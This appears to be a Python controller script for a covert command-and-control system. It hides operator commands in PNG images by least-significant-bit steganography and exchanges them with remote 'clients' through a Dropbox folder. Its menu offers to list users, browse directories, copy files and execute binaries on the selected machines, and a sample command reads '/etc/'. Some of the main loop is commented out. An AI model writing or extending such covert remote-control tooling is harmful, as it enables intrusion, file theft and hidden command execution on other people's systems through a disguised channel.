import dropbox
import sys
import select
import time
from datetime import datetime
from stegano import lsb
from randimage import get_random_image
import io
import matplotlib


#in miliseconds
HEARTBEAT_PERIOD = 300000

def current_time():
    return round(time.time() * 1000)

def current_datetime():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    for entry in dbx.files_list_folder('').entries:
        print(entry.name)

    return dbx


def print_prompt():
    print("\nType 1-6 to select a feature")
    print("1 - list of users currently logged in")
    print("2 dir_path - list content of specified directory")
    print("3 - id of current user")
    print("4 file_path - copy a file in specified path")
    print("5 bin_path - execute a binary from specified path")
    print("6 - select client")
    print("7 - exit")


def handle_client_selection(clients):
    print("\nSelect client name for sending commands")
    for i, client in enumerate(clients):
        print(str(i) + " " + client)
    print("Type 0-" + str(len(clients)-1) + " to select a client")

    i, o, e = select.select([sys.stdin], [], [], 15)
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if len(words) != 1 or int(words[0]) < 0 or int(words[0]) >= len(clients):
            print("Error - Invalid Client")
        else:
            return int(words[0])
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2    

def handle_command_selection(clients):
    print_prompt()
    i, o, e = select.select([sys.stdin], [], [], 15) #timeout after 15 seconds
    if i:
        input_string = sys.stdin.readline()
        words = input_string.strip().split()
        if len(words) > 2 or len(words) < 1 or words[0] not in ['1','2','3','4', '5', '6', '7']:
            print("Error - Invalid Command")
        elif words[0] in ['2','4', '5'] and len(words) != 2:
            print("Error - Invalid Command Missing Argument")
        elif len(words) == 2 and words[0] not in ['2','4','5','6']:
            print("Error - Invalid Command")
        elif words[0] == '6':
            return handle_client_selection(clients)
        elif words[0] == '7':
            return -1
        else:
            print("Executing " + input_string)
        print("")
    else:
        print("Timing out input to perform logic, wait for prompt...")
        print("")

    return -2


def send_heartbeat(dbx):
    print(current_datetime() + " Sending heartbeat")
    files = []
    for entry in dbx.files_list_folder('/art').entries:
        dbx.files_download_to_file("./" + entry.name, entry.path_lower)


def execute_command(dbx, command, client):
    header = current_datetime() + "|REQUEST|" + command + "|" + client + "|\n"
    print(header)
     
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == client:
            dbx.files_download_to_file("./" + entry.name, entry.path_lower)

    message = lsb.reveal(client, lsb.generators.eratosthenes())
    message += header 
    secret = lsb.hide(client, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/test_' + client)

""" if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN")
    else:
        dbx = init(sys.argv[1])
        #secret = lsb.hide("./cute_in.png", "Hello world!\n",  lsb.generators.eratosthenes())
        #secret.save("./cute_out.png")

        last_heartbeat = -1

        clients = ["ahston", "laudna", "imogen"]
        selected_client = -1

        while True:
            print("Selected client " + str(selected_client))
            if abs(last_heartbeat - current_time()) > HEARTBEAT_PERIOD:
                send_heartbeat(dbx)
                last_heartbeat = current_time()
            else:
              # read command
              res = handle_command_selection(clients) 
              if res == -1:
                  break
              elif res >= 0:
                  selected_client = res
 """

""" if __name__ == "__main__":
    img_size = (128,128)
    img = get_random_image(img_size)

    matplotlib.image.imsave('test.png', img)
    secret = lsb.hide("./test.png", "Hello world!\n",  lsb.generators.eratosthenes())
    secret.save("./test.png")

    for i in range(100):
        print(i)
        message = lsb.reveal("./test.png", lsb.generators.eratosthenes())
        message += str(i) + '\n'
        secret = lsb.hide("./test.png", message,  lsb.generators.eratosthenes())
        secret.save("./test.png")
        #lsb.hide("./test.png", message,  lsb.generators.eratosthenes())

    print("Out")
    print(lsb.reveal("./test.png", lsb.generators.eratosthenes())) """

if __name__ == '__main__':
    #test_str = "30/12/2023 19:56:59|REQUEST|ls /etc/|ahston|"
    #print(test_str.split('|'))
    dbx = init(sys.argv[1])
    execute_command(dbx, 'ls /etc/', 'test.png')